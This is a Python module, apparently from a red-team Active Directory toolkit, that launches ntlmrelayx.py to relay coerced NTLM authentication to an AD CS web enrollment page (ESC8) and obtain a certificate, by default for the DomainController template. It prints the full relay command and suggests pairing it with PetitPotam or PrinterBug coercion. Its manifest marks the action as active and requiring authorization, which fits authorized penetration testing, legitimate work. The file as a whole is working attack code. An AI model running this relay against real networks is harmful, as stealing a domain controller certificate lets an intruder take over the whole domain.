"""AD CS relay  -  ESC8 HTTP enrollment relay for certificate theft."""
import subprocess
import sys
import shutil
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.relay.adcs_relay.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ntlm_relay", "certificate_enrollment"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1557.001", "T1649"],
}


def run(args: Any) -> int:
    ca_host = args.target
    template = getattr(args, "adcs_template", "DomainController")
    targets_file = getattr(args, "targets_file", None)

    if not shutil.which("ntlmrelayx.py"):
        print("[!] ntlmrelayx.py not found", file=sys.stderr)
        return 1

    cmd = [
        "ntlmrelayx.py", "-smb2support",
        "-t", f"http://{ca_host}/certsrv/certfnsh.asp",
        "--adcs", "--template", template,
    ]

    if targets_file:
        cmd.extend(["-tf", targets_file])

    print(f"[*] AD CS ESC8 relay → CA={ca_host}, template={template}")
    print("[*] Waiting for coerced auth to relay to certsrv...")
    print("[*] Command: {}".format(" ".join(cmd)))
    print("[*] Tip: combine with PetitPotam/PrinterBug for coercion source")

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                text=True, bufsize=1)
        print(f"[+] Relay running (PID {proc.pid})")
        for line in proc.stdout:
            print(f"  {line.rstrip()}")
            if "certificate" in line.lower() or "base64" in line.lower():
                print("[+] Certificate obtained!")
                break
        return 0
    except KeyboardInterrupt:
        print("\n[*] Relay stopped")
        return 0
    except Exception as exc:
        print(f"[-] ADCS relay error: {exc}", file=sys.stderr)
        return 1
